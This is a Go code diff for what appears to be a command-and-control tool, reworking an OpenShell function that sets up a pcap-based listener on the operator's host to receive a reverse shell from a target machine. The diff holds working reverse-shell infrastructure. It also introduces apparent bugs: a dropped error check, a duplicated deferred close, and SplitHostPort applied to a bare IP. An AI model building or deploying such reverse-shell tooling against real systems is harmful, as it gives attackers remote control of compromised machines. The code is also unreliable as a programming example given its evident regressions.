@@ -111,55 +111,50 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
+	// Obtains the source ip and picks a random port for the reverse shell
+	rawIP := network.LocalIP().String()
 	srcPort := rand.Intn(45000) + 10000
-	srcIP := network.LocalIP().String()
+	srcIP, _, err := net.SplitHostPort(rawIP)
+	if err != nil {
+		srcIP = rawIP
+	}
 
+	// ========= PCAP TCP STACK ==========
 	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer stop()
 
-	setupCtx, cancelSetup := context.WithTimeout(ctx, 30*time.Second)
-	defer cancelSetup()
+	setupCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+
+	pool, err := netip.ParsePrefix("172.16.0.0/16")
+	if err != nil {
+		return fmt.Errorf("invalid -subnet: %w", err)
+	}
+
+	// Valid host gateway inside the subnet pool range
+	virtualIP, err := netip.ParseAddr("172.16.0.1")
+	if err != nil {
+		return err
+	}
 
 	addr := network.LocalIP().IP
-	localIP, ok := netip.AddrFromSlice(addr)
-	if !ok {
-		return fmt.Errorf("could not convert local IP to netip.Addr")
-	}
-	localIP = localIP.Unmap()
-
+	localIP, _ := netip.AddrFromSlice(addr)
 	device, err := network.GetNetworkInterface(addr)
 	if err != nil {
 		return fmt.Errorf("invalid interface: %w", err)
 	}
 
-	udpCfg := pcapnet.UDPConfig{
-		DeviceName:     device.Name,
-		LocalIP:        localIP,
-		LocalPort:      uint16(srcPort),
-		ReserveUDPPort: true,
-	}
+	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
+	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
 
-	pool, err := netip.ParsePrefix("172.16.0.0/24")
-	if err != nil {
-		return fmt.Errorf("invalid subnet: %w", err)
-	}
-	virtualIP, err := netip.ParseAddr("172.16.0.1")
-	if err != nil {
-		return fmt.Errorf("invalid virtual IP: %w", err)
-	}
-	serverCfg := pcapnet.ServerConfig{
-		VirtualIP:   virtualIP,
-		AddressPool: pool,
-		MTU:         1200,
-		MaxPeers:    1,
-	}
-
-	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
+	var listener *pcapnet.TCPServer
+	listener, err = pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
 	}
 	defer listener.Close()
-	cancelSetup()
+	// ========= PCAP TCP STACK ==========
+	defer listener.Close()
 
 	portStr := strconv.Itoa(srcPort)
 	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
